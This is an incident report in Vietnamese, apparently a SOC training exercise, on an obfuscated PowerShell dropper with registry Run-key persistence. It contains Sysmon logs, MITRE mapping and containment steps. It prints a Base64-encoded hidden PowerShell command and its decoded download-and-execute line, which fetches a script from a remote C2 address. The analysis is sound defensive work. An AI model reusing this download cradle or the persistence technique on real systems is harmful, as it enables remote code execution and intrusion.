# INCIDENT INVESTIGATION REPORT: INC-2026-003
## Windows Obfuscated PowerShell Execution & Registry Persistence

---

### 1. THÔNG TIN CHUNG (INCIDENT METADATA)
| Thông tin | Chi tiết |
| :--- | :--- |
| **Ticket ID** | INC-2026-003 |
| **Mức độ nghiêm trọng (Severity)** | **High (P2)** |
| **Trạng thái (Status)** | Contained / Endpoint Isolated |
| **Phân loại (Classification)** | **True Positive (TP - Malware Dropper & Persistence)** |
| **Người trực / Phân tích (Analyst)** | SOC Analyst Tier 1 |
| **Thời gian phát hiện** | 2026-10-30 14:30:15 (UTC+7) |
| **Nguồn log (Log Source)** | `shared-logs/windows_sysmon.json` (JSON Replay) |
| **Luật SIEM kích hoạt (Alert)** | Rule ID `100301` (Level 10) & Rule ID `100302` (Level 10) |

---

### 2. TÓM TẮT SỰ CỐ (EXECUTIVE SUMMARY)
Hệ thống SIEM tiếp nhận sự kiện Sysmon Event ID 1 từ luồng JSON Replay ghi nhận tiến trình `powershell.exe` thực thi với tham số `-enc` mang chuỗi Base64 dài và chế độ ẩn cửa sổ (`-w hidden`). Tiến trình cha khởi tạo là tệp `cmd.exe /c start_invoice.bat` nằm trong thư mục Downloads của người dùng `CORP\victim_user`.

Tiếp theo sau đó, sự kiện Sysmon Event ID 13 ghi nhận khóa Registry `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdateCheck` bị chỉnh sửa để trỏ tới tệp thực thi `C:\Users\Public\update.exe`.

Analyst thực hiện giải mã chuỗi Base64 sang văn bản UTF-16LE, phát hiện dòng lệnh tải mã độc từ máy chủ điều khiển `http://185.220.101.5/beacon.ps1`. Sự cố được kết luận là **True Positive**.

---

### 3. BẰNG CHỨNG LOG CHI TIẾT
```json
{"EventID": "1", "UtcTime": "2026-10-30 07:30:15.120", "ProcessGuid": "{8d5a6a32-1234-5678-abcd-ef0123456789}", "ProcessId": "4892", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGIAZQBhAGMAbwBuAC4AcABzADEAJwApAA==", "CurrentDirectory": "C:\\Users\\victim_user\\Downloads\\", "User": "CORP\\victim_user", "ParentProcessId": "3412", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe /c start_invoice.bat", "Hashes": "SHA256=DE96A6E699FE5EDDE18877540EEA69C4B7FE7BFF846066FAFFCA51F26FFC932D"}
{"EventID": "13", "UtcTime": "2026-10-30 07:30:18.450", "ProcessGuid": "{8d5a6a32-1234-5678-abcd-ef0123456789}", "ProcessId": "4892", "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "TargetObject": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdateCheck", "Details": "C:\\Users\\Public\\update.exe", "User": "CORP\\victim_user"}
```

#### Kết quả giải mã chuỗi Base64 (UTF-16LE):
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/beacon.ps1')
```

---

### 4. MITRE ATT&CK MAPPING
| Tactic | Technique ID | Tên kỹ thuật | Mô tả |
| :--- | :--- | :--- | :--- |
| **Execution** | `T1059.001` | PowerShell | Thực thi dòng lệnh PowerShell tải tệp từ xa |
| **Defense Evasion** | `T1027` | Obfuscated Command Line | Mã hóa Base64 chuỗi command line che giấu nội dung |
| **Persistence** | `T1547.001` | Registry Run Keys | Ghi khóa tự khởi động tại `HKCU\...\Run` |

---

### 5. HÀNH ĐỘNG XỬ LÝ (CONTAINMENT)
1. Cách ly trạm làm việc khỏi hệ thống mạng để cắt kết nối C2 tới `185.220.101.5`.
2. Dừng tiến trình PID `4892` (`powershell.exe`) và các tiến trình con liên quan.
3. Xóa khóa Registry độc hại:
   ```cmd
   reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f
   ```
4. Xóa tệp độc hại: `C:\Users\Public\update.exe` và `C:\Users\victim_user\Downloads\start_invoice.bat`.
